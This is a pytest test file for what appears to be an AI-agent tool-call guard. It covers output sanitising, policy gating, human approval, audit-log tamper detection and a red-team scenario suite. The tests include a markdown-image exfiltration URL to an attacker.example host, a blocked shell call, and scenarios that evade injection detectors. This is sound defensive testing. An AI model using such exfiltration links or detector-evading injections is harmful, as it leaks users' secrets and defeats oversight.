import json

import pytest
import yaml

from agentgate import ApprovalDenied, AuditLog, Gate, Guard, Policy, Segment, ToolBlocked, ToolCall, sanitize_output
from agentgate.policy import default_policy_path
from agentgate.redteam import default_scenarios_path, run

POLICY = Policy.load(default_policy_path())
GATE = Gate(POLICY)


# --- output sanitiser ---------------------------------------------------------------
def test_sanitiser_strips_exfil_image():
    r = sanitize_output("ok ![s](https://collect.attacker.example/p?d=secret)", POLICY.render_hosts)
    assert "attacker.example" not in r.text and r.changed


def test_sanitiser_delinks_external_link_keeps_text():
    r = sanitize_output("see [docs](https://evil.example/x)", POLICY.render_hosts)
    assert r.text.startswith("see docs") and "evil.example" in r.findings[0]


def test_sanitiser_leaves_allowlisted_content():
    text = "![logo](https://cdn.corp.example/l.png) and [hr](https://hr.corp.example)"
    assert sanitize_output(text, POLICY.render_hosts).text == text


# --- enforcement --------------------------------------------------------------------
def make_guard(approver=None, audit=None, alerts=None):
    tools = {"search_kb": lambda a: f"results for {a}", "create_ticket": lambda a: "TKT-1", "delete_record": lambda a: "deleted"}
    kw = {"approver": approver} if approver else {}
    return Guard(GATE, tools, audit=audit, on_alert=(alerts.append if alerts is not None else None), **kw)


def test_guard_runs_allowed_call():
    assert make_guard().call([Segment.trusted_("q")], ToolCall("search_kb", "q=vpn")) == "results for q=vpn"


def test_guard_blocks_and_alerts():
    alerts = []
    with pytest.raises(ToolBlocked):
        make_guard(alerts=alerts).call([Segment.trusted_("x")], ToolCall("run_shell", "id"))
    assert alerts and alerts[0].action.name == "BLOCK"


def test_guard_default_approver_denies():
    with pytest.raises(ApprovalDenied):
        make_guard().call([Segment.untrusted("raise it")], ToolCall("create_ticket", "t"))


def test_guard_runs_after_human_approval():
    g = make_guard(approver=lambda call, d: "analyst@corp.example")
    assert g.call([Segment.untrusted("raise it")], ToolCall("create_ticket", "t")) == "TKT-1"


def test_guard_fails_closed_on_gate_error():
    class Broken(Gate):
        def evaluate(self, context, call):
            raise ValueError("boom")
    g = Guard(Broken(POLICY), {"search_kb": lambda a: "ran"})
    with pytest.raises(RuntimeError, match="call refused"):
        g.call([], ToolCall("search_kb", ""))


# --- audit chain ----------------------------------------------------------------------
def test_audit_chain_verifies_redacts_and_detects_tampering(tmp_path):
    log = AuditLog(tmp_path / "audit.jsonl")
    g = make_guard(audit=log, approver=lambda c, d: "lead@corp.example")
    g.call([Segment.trusted_("q")], ToolCall("search_kb", "q=vpn"))
    with pytest.raises(ToolBlocked):
        g.call([Segment.trusted_("q")], ToolCall("create_ticket", "body=AKIAIOSFODNN7EXAMPLE"))
    g.call([Segment.trusted_("q")], ToolCall("delete_record", "id=9"))
    assert log.verify() == (True, None)

    lines = log.path.read_text().splitlines()
    assert "AKIAIOSFODNN7EXAMPLE" not in "".join(lines) and "[REDACTED:aws-access-key-id]" in lines[1]
    assert json.loads(lines[2])["approved_by"] == "lead@corp.example"

    rec = json.loads(lines[0]); rec["decision"]["action"] = "BLOCK"
    lines[0] = json.dumps(rec, sort_keys=True)
    log.path.write_text("\n".join(lines) + "\n")
    assert log.verify() == (False, 1)


# --- red-team CI gate ---------------------------------------------------------------------
def test_redteam_suite_passes():
    scenarios = yaml.safe_load(default_scenarios_path().read_text(encoding="utf-8"))
    report = run(POLICY, scenarios)
    assert report.gated_asr == 0
    assert report.false_blocks == 0
    assert report.passed
    assert report.naive_asr > 0.4  # the suite must actually be attacking something


def test_detector_evading_attacks_still_fail():
    """AG-03 and AG-09 carry no injection markers; provenance and allowlists must stop them anyway."""
    scenarios = yaml.safe_load(default_scenarios_path().read_text(encoding="utf-8"))
    by_id = {a["id"]: a for a in scenarios["attacks"]}
    for aid, expect in (("AG-03", "BLOCK"), ("AG-09", "REQUIRE_APPROVAL")):
        sc = by_id[aid]
        d = GATE.evaluate([Segment(**c) for c in sc["context"]], ToolCall(**sc["call"]))
        assert not any(r.rule_id.startswith("R3") for r in d.rules), aid
        assert d.action.name == expect, aid
